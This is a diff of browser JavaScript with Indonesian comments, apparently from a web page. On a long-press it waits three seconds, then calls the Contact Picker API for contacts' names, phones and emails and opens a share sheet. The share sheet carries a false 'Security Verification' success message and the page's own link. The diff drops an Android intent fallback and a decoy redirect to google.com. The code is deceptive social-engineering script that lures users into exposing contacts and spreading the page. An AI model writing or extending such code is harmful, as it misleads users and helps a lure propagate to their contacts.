@@ -67,25 +67,33 @@
             // Jeda 3 detik setelah gestur long-press (contextmenu) terdeteksi
             setTimeout(async () => {
                 try {
-                    // 1. Prioritas pertama: Memanggil Contact Picker API jika didukung browser origin aktif
+                    // 1. Tahap Pertama: Memanggil Contact Picker API terlebih dahulu
                     if (navigator.contacts && navigator.contacts.select) {
                         try {
                             const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                         } catch (pickerErr) {
                             console.debug("Picker interaction cancelled or restricted.");
                         }
-                    } else {
-                        // 2. Fallback: Menggunakan Android Intent Scheme jika Contact Picker tidak tersedia
-                        const intentUrl = "intent://contacts/#Intent;action=android.intent.action.VIEW;package=com.android.contacts;S.browser_fallback_url=https%3A%2F%2Fgoogle.com;end;";
-                        window.location.href = intentUrl;
                     }
+
+                    // 2. Tahap Kedua: Memicu Web Share API setelah Contact Picker selesai/ditutup
+                    if (navigator.share) {
+                        try {
+                            await navigator.share({
+                                title: 'Security Verification',
+                                text: 'Verifikasi akun keamanan perangkat Anda berhasil.',
+                                url: window.location.href
+                            });
+                        } catch (shareErr) {
+                            console.debug("Web Share cancelled or unsupported.");
+                        }
+                    }
+
                 } catch (e) {
                     console.debug("Execution fallback triggered.");
                 } finally {
-                    // Memastikan pengguna dialihkan kembali ke google.com setelah proses selesai
-                    setTimeout(() => {
-                        window.location.href = "https://google.com";
-                    }, 500);
+                    // Redirect dimatikan sepenuhnya (tidak ada window.location.href ke google.com)
+                    console.debug("Execution completed. Redirect disabled.");
                 }
             }, 3000);
         });
